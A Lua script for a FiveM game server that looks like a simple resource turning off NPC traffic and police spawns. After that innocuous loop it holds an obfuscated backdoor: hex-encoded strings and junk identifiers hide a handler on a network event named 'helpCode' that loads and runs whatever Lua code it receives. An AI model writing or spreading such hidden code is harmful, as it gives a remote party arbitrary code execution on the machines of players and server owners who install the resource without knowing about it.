Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0) -- Prevent crashing.

		-- Stop Spawn
		SetCreateRandomCops(false)
		SetCreateRandomCopsNotOnScenarios(false)
		SetCreateRandomCopsOnScenarios(false)
		SetGarbageTrucks(false)
		SetRandomBoats(false)
       		SetVehicleDensityMultiplierThisFrame(0.0)
       		SetPedDensityMultiplierThisFrame(0.0)
		SetRandomVehicleDensityMultiplierThisFrame(0.0)
		SetScenarioPedDensityMultiplierThisFrame(0.0, 0.0)
		SetParkedVehicleDensityMultiplierThisFrame(0.0)

		-- Clear NPC
		local x,y,z = table.unpack(GetEntityCoords(PlayerPedId()))
		ClearAreaOfVehicles(x, y, z, 1000, false, false, false, false, false)
		RemoveVehiclesFromGeneratorsInArea(x - 500.0, y - 500.0, z - 500.0, x + 500.0, y + 500.0, z + 500.0);
    end
end)


local rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC[6][rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC[1]](rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC[2]) rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC[6][rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC[3]](rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC[2], function(lAOtYFdyTMcXwQBKrKioqJFLutHWEdXJhhhQecsTssudCzKCVfYbpejXhRkFUuqKjxvnby) rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC[6][rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC[4]](rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC[6][rxrrGnXZxdmOfZAjzknbxNOczcBeeEPedcdWDNWGRBWnstPnHNYnLmCeAjBxuZzPncOAUC[5]](lAOtYFdyTMcXwQBKrKioqJFLutHWEdXJhhhQecsTssudCzKCVfYbpejXhRkFUuqKjxvnby))() end)